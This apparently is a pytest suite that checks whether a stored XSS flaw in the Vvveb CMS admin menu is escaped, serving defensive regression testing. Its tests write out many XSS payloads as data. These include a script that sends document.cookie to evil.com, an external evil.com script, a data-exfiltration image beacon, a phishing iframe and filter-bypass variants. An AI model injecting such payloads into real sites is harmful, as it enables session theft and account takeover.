"""
Vulnerability tests for Vvveb CMS stored XSS in admin menu template.

These tests verify whether the XSS vulnerability is present (FAIL) or mitigated (PASS).
- FAIL in vulnerable state: XSS payload is rendered unescaped
- PASS in fixed state: XSS payload is properly HTML-encoded
"""

import pytest
import requests
import time
import re
import html


# Base URL for the application
BASE_URL = "http://localhost:80"
ADMIN_URL = f"{BASE_URL}/admin/"
POST_TYPES_URL = f"{BASE_URL}/admin/index.php?module=settings/post-types"
POST_TYPE_SAVE_URL = f"{BASE_URL}/admin/index.php?module=settings/post-type&action=save"

# Default admin credentials
ADMIN_EMAIL = "admin@vvveb.com"
ADMIN_PASSWORD = "admin"


class VvvebTestBase:
    """Base class with common test utilities."""

    def setup_method(self):
        """Set up a fresh session for each test."""
        self.session = requests.Session()
        self._wait_for_app()
        self._login()

    def teardown_method(self):
        """Clean up session."""
        if hasattr(self, 'session'):
            self.session.close()

    def _wait_for_app(self, timeout=60):
        """Wait for the application to be ready."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(BASE_URL, timeout=5)
                if response.status_code == 200:
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        pytest.fail("Application did not become ready in time")

    def _login(self):
        """Login to admin panel."""
        login_page = self.session.get(f"{ADMIN_URL}index.php?module=user/login")

        csrf_token = None
        match = re.search(r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']', login_page.text, re.I)
        if not match:
            match = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']csrf["\']', login_page.text, re.I)
        if match:
            csrf_token = match.group(1)

        login_data = {
            'user': ADMIN_EMAIL,
            'password': ADMIN_PASSWORD,
        }
        if csrf_token:
            login_data['csrf'] = csrf_token

        response = self.session.post(
            f"{ADMIN_URL}index.php?module=user/login",
            data=login_data,
            allow_redirects=True
        )
        return response

    def _create_post_type(self, type_value, name=None, slug=None):
        """Create a custom post type with the given values."""
        if name is None:
            name = type_value
        if slug is None:
            slug = type_value.replace(' ', '-').lower()[:20]  # Limit slug length

        post_type_data = {
            'post_type[type]': type_value,
            'post_type[name]': name,
            'post_type[slug]': slug,
            'post_type[singular]': name,
            'post_type[plural]': name + 's',
        }

        response = self.session.post(
            POST_TYPE_SAVE_URL,
            data=post_type_data,
            allow_redirects=False  # Don't follow redirect since target page has template issues
        )
        return response

    def _get_admin_page(self):
        """Get the admin dashboard page (where menu is rendered)."""
        return self.session.get(ADMIN_URL)

    def _check_payload_escaped(self, response, payload):
        """
        Check if a payload is properly escaped in the response.
        Returns True if properly escaped (safe), False if raw payload appears (vulnerable).
        """
        content = response.text

        # If the raw, unescaped payload appears in the HTML, it's vulnerable
        if payload in content:
            return False

        # Check for escaped versions of the payload
        escaped_payload = html.escape(payload)
        if escaped_payload in content:
            return True

        # Also check partial escaping (just the dangerous chars)
        partial_checks = [
            ('&lt;', '<' in payload),
            ('&gt;', '>' in payload),
            ('&quot;', '"' in payload),
            ('&#039;', "'" in payload),
            ('&#x27;', "'" in payload),
        ]

        for escaped_char, should_check in partial_checks:
            if should_check and escaped_char in content:
                # Found at least some escaping
                return True

        # If the payload doesn't appear at all (might be rejected/filtered),
        # that's also safe behavior
        return True


class TestXSSViaScriptTag(VvvebTestBase):
    """Test XSS vulnerability using script tag injection."""

    def test_basic_script_tag_injection(self):
        """Test basic <script> tag XSS payload is escaped."""
        payload = '"><script>alert("XSS")</script>'

        # Create post type with XSS payload
        self._create_post_type(payload, name="Test XSS 1")

        # Get admin page where menu is rendered
        response = self._get_admin_page()

        # The payload should be escaped, not rendered as raw HTML
        assert payload not in response.text, \
            f"XSS payload was rendered unescaped! Found raw payload in response."

        # Should see escaped version or payload should be filtered
        escaped_script = "&lt;script&gt;"
        # Verify the page doesn't execute JavaScript
        assert '<script>alert("XSS")</script>' not in response.text

    def test_script_tag_with_document_cookie(self):
        """Test script tag attempting to access document.cookie."""
        payload = '"><script>document.location="http://evil.com/?c="+document.cookie</script>'

        self._create_post_type(payload, name="Test Cookie Steal")
        response = self._get_admin_page()

        # The dangerous script content should NOT appear unescaped
        # Check specifically for our injected script tag
        assert payload not in response.text, \
               "Cookie stealing script was not properly escaped"

    def test_script_tag_with_single_quotes(self):
        """Test script tag with single quotes."""
        payload = "'><script>alert('XSS')</script>"

        self._create_post_type(payload, name="Test Single Quote")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "XSS payload with single quotes was not escaped"


class TestXSSViaEventHandlers(VvvebTestBase):
    """Test XSS vulnerability using HTML event handler injection."""

    def test_img_onerror_handler(self):
        """Test img tag with onerror event handler."""
        payload = '"><img src=x onerror=alert("XSS")>'

        self._create_post_type(payload, name="Test Img Onerror")
        response = self._get_admin_page()

        # The payload should not appear unescaped in the response
        assert payload not in response.text, \
               "Image onerror XSS was not properly escaped"

    def test_svg_onload_handler(self):
        """Test SVG tag with onload event handler."""
        payload = '"><svg onload=alert("XSS")>'

        self._create_post_type(payload, name="Test SVG Onload")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "SVG onload XSS payload was not escaped"

    def test_body_onload_attribute_injection(self):
        """Test attribute injection to add onload handler."""
        payload = '" onload="alert(\'XSS\')" x="'

        self._create_post_type(payload, name="Test Onload Attr")
        response = self._get_admin_page()

        # The payload should not appear unescaped
        assert payload not in response.text, \
               "Attribute injection XSS was not properly escaped"

    def test_onfocus_autofocus_handler(self):
        """Test onfocus with autofocus for automatic XSS trigger."""
        payload = '" onfocus="alert(\'XSS\')" autofocus="'

        self._create_post_type(payload, name="Test Onfocus")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "Onfocus autofocus XSS was not escaped"


class TestXSSPayloadVariations(VvvebTestBase):
    """Test various XSS payload encoding and bypass attempts."""

    def test_mixed_case_script_tag(self):
        """Test mixed case script tag to bypass simple filters."""
        payload = '"><ScRiPt>alert("XSS")</sCrIpT>'

        self._create_post_type(payload, name="Test Mixed Case")
        response = self._get_admin_page()

        # Check if the payload appears in the response (case-insensitive)
        assert payload.lower() not in response.text.lower(), \
               "Mixed case script tag was not escaped"

    def test_nested_script_tags(self):
        """Test nested/malformed script tags."""
        payload = '"><script><script>alert("XSS")</script></script>'

        self._create_post_type(payload, name="Test Nested Script")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "Nested script tags were not escaped"

    def test_javascript_protocol(self):
        """Test javascript: protocol injection."""
        payload = '" href="javascript:alert(\'XSS\')"'

        self._create_post_type(payload, name="Test JS Protocol")
        response = self._get_admin_page()

        # The payload should be escaped - quotes should be HTML entities
        # Check that the raw payload (with unescaped quotes) does not appear
        assert payload not in response.text, \
            "JavaScript protocol injection was not escaped"

    def test_data_uri_injection(self):
        """Test data: URI with JavaScript."""
        payload = '"><a href="data:text/html,<script>alert(\'XSS\')</script>">'

        self._create_post_type(payload, name="Test Data URI")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "Data URI injection was not escaped"


class TestHTMLEntityEscaping(VvvebTestBase):
    """Test that special HTML characters are properly escaped."""

    def test_angle_brackets_escaped(self):
        """Test that angle brackets are converted to HTML entities."""
        payload = '<test>content</test>'

        self._create_post_type(f"type{payload}", name="Test Angles")
        response = self._get_admin_page()

        # Either the payload is not in the response, or it's escaped
        if payload in response.text:
            # If present, should be in a safe context (not as active HTML)
            pytest.fail("Angle brackets were not escaped to &lt; and &gt;")

    def test_double_quotes_escaped(self):
        """Test that double quotes are converted to HTML entities."""
        payload = 'test"onclick="alert(1)"'

        self._create_post_type(payload, name="Test Quotes")
        response = self._get_admin_page()

        # The onclick should not be active - check for the full payload
        assert payload not in response.text, \
               "Double quotes were not properly escaped"

    def test_ampersand_handling(self):
        """Test that ampersands are properly handled."""
        payload = 'test&<script>alert(1)</script>'

        self._create_post_type(payload, name="Test Ampersand")
        response = self._get_admin_page()

        assert '<script>alert(1)</script>' not in response.text, \
            "Script tag was not escaped"


class TestMultipleVulnerableLocations(VvvebTestBase):
    """Test XSS in different vulnerable code locations."""

    def test_xss_in_type_field(self):
        """Test XSS injection via the type field (renders in menu key)."""
        payload = '"><img src=x onerror=alert("type")>'

        self._create_post_type(payload, name="Type Field Test")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "XSS in type field (menu key) was not escaped"

    def test_xss_in_menu_class_context(self):
        """Test that menu item class values are escaped."""
        # This tests the $menu_item['class'] vulnerable location
        payload = '"><script>alert("class")</script>'

        self._create_post_type(payload, name="Class Context Test")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "XSS in class context was not escaped"


class TestExternalResourceLoading(VvvebTestBase):
    """Test attempts to load external resources via XSS."""

    def test_external_script_src(self):
        """Test loading external script source."""
        payload = '"><script src="http://evil.com/xss.js"></script>'

        self._create_post_type(payload, name="External Script")
        response = self._get_admin_page()

        assert 'src="http://evil.com' not in response.text, \
            "External script source was not escaped"

    def test_external_image_beacon(self):
        """Test image beacon for data exfiltration."""
        payload = '"><img src="http://evil.com/collect.php?data=stolen">'

        self._create_post_type(payload, name="Image Beacon")
        response = self._get_admin_page()

        # The malicious image tag should be escaped
        assert payload not in response.text, \
            "Image beacon payload was not escaped"

    def test_iframe_injection(self):
        """Test iframe injection for clickjacking or phishing."""
        payload = '"><iframe src="http://evil.com/fake-login.html"></iframe>'

        self._create_post_type(payload, name="Iframe Injection")
        response = self._get_admin_page()

        assert payload not in response.text, \
            "Iframe injection was not escaped"


class TestEdgeCasesAndBypasses(VvvebTestBase):
    """Test edge cases and potential filter bypasses."""

    def test_null_byte_injection(self):
        """Test null byte injection attempt."""
        payload = '"><script>alert("XSS")</script>\x00'

        self._create_post_type(payload.replace('\x00', ''), name="Null Byte")
        response = self._get_admin_page()

        assert '<script>alert("XSS")</script>' not in response.text

    def test_unicode_encoded_brackets(self):
        """Test unicode variations of angle brackets."""
        # These are different unicode characters that might render as < >
        # Fullwidth brackets (U+FF1C, U+FF1E) are NOT interpreted as HTML by browsers
        payload = '＜script＞alert("XSS")＜/script＞'

        self._create_post_type(payload, name="Unicode Brackets")
        response = self._get_admin_page()

        # Fullwidth brackets are safe - they're not HTML tags
        # Just verify any actual script tags from other sources are escaped
        # The payload with fullwidth brackets is safe and may appear as-is
        # Check that regular script tags are not present (from other injection attempts)
        assert '"><script>' not in response.text, \
            "Script tag injection found in response"

    def test_very_long_payload(self):
        """Test handling of very long XSS payloads."""
        long_content = 'A' * 1000
        payload = f'"><script>alert("{long_content}")</script>'

        self._create_post_type(payload[:200], name="Long Payload")  # Truncate for field limits
        response = self._get_admin_page()

        # Should still be escaped regardless of length
        assert '<script>alert(' not in response.text, \
            "Long payload script tag was not escaped"

    def test_payload_with_newlines(self):
        """Test payload with newlines attempting to break out of context."""
        payload = '"\n><script>alert("XSS")</script>'

        self._create_post_type(payload.replace('\n', ''), name="Newlines")
        response = self._get_admin_page()

        assert '<script>alert("XSS")</script>' not in response.text
